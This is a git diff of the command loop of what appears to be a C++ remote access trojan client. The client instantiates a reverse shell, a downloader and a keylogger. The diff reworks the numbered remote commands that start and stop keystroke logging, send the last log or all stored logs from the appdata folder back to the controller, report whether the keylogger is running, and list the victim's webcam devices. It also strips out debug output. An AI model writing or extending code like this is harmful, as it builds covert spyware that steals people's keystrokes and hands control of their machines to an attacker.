@@ -46,7 +46,7 @@ int main(int argc=0,char*argv[]= nullptr) {
                 ReverseShell reverseShell(stream);
                 Download download(stream);
 #ifdef KEYLOGGER
-                KeyLogger keyLogger(stream,KEYLOGGER);
+                KeyLogger keyLogger(stream);
                 keyLogger.tryStart();
 #endif
                 while (streamListening) {
@@ -109,53 +109,33 @@ int main(int argc=0,char*argv[]= nullptr) {
                             break;
                         }
 #ifdef KEYLOGGER
-                        case 12: {
-                            std::cout << "START KEYLOGGER" << std::endl;
+                        case 12: { // tries to start in new thread the keylogger if it's not running
                             keyLogger.tryStart();
                             break;
                         }
-                        case 13: {
-                            std::cout << "STOP KEYLOGGER" << std::endl;
-                            if (keyLogger.isRecordingKeys()) keyLogger.setRecordingKeys(false);
+                        case 13: { // stops keylogger
+                            keyLogger.stopKeylogger();
                             break;
                         }
 
-                        case 1401: {
-                            std::cout << "DUMP KEYLOGGER LOG" << std::endl;
-                            keyLogger.sendKeyLoggerLog();
+                        case 4: { // sends last log file in current session of client
+                            keyLogger.send();
                             break;
                         }
-                        case 1402: {
-                            std::cout << "DUMP ALL KEYLOGGER LOGS" << std::endl;
-                            keyLogger.sendAllKeyLoggerLogs();
+                        case 14: { // sends all logs located on appdata folder
+                            keyLogger.sendAll();
                             break;
                         }
-                        case 1403: {
-                            std::cout << "CHECK LAST " << std::endl;
-                            stream.sendSize(keyLogger.lastLogExists());
-                            break;
-                        }
-                        case 1404: {
-                            std::cout << "CHECK ALL " << std::endl;
-                            std::cout << keyLogger.logsExists();
-                            stream.sendSize(keyLogger.logsExists());
-                            break;
-                        }
-                        case 15: {
-                            std::cout << "GET INFORMATION " << std::endl;
-                            stream.sendSize(keyLogger.isRecordingKeys());
+                        case 15: { // sends if the keylogger is currently working
+                            keyLogger.sendState();
                             break;
                         }
 #endif
                         case 16: {
-                            std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                             DeviceEnumerator de;
                             std::map<int, Device> devices = de.getVideoDevicesMap();
                             std::vector<std::string> webcamVector;
                             for (auto const &device: devices) {
-                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
-                                std::cout << "Name: " << device.second.deviceName << std::endl;
-                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                 webcamVector.push_back(device.second.deviceName);
                             }
                             stream.sendList(webcamVector);
